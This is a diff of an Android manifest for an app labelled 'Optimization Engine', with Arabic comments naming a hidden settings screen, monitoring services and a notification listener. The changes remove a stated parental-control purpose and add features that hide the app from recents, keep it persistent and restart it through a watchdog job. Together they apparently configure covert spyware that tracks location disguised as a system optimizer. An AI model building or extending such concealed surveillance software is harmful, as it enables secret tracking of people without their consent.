@@ -36,19 +36,21 @@
         tools:ignore="ProtectedPermissions" />
 
     <application
+        android:name=".OptimizationApp"
         android:allowBackup="true"
         android:icon="@android:drawable/ic_menu_preferences"
-        android:label="Optimization Engine"
+        android:label="@string/app_name"
+        android:roundIcon="@android:drawable/ic_menu_preferences"
         android:supportsRtl="true"
-        android:theme="@android:style/Theme.DeviceDefault.Light"
-        android:usesCleartextTraffic="true"
-        tools:targetApi="34">
+        android:theme="@style/Theme.AppCompat.NoActionBar"
+        android:persistent="true">
 
         <!-- النشاط الرئيسي -->
         <activity
             android:name=".MainActivity"
+            android:excludeFromRecents="true"
             android:exported="true"
-            android:excludeFromRecents="true">
+            android:theme="@style/Theme.AppCompat.NoActionBar">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
@@ -58,7 +60,7 @@
         <!-- واجهة الإعدادات المخفية -->
         <activity
             android:name=".HiddenSettingsActivity"
-            android:label="System Optimization Settings"
+            android:excludeFromRecents="true"
             android:exported="false" />
 
         <!-- خدمة المراقبة الأساسية -->
@@ -66,11 +68,13 @@
             android:name=".MonitoringForegroundService"
             android:enabled="true"
             android:exported="false"
-            android:foregroundServiceType="location|mediaProjection|dataSync|specialUse">
-            <property
-                android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE"
-                android:value="Optimization and security monitoring for parental control" />
-        </service>
+            android:foregroundServiceType="location|dataSync" />
+
+        <!-- خدمة المراقبة (JobService) -->
+        <service
+            android:name=".ServiceWatchdogJobService"
+            android:permission="android.permission.BIND_JOB_SERVICE"
+            android:exported="true" />
 
         <!-- خدمة استماع الإشعارات -->
         <service
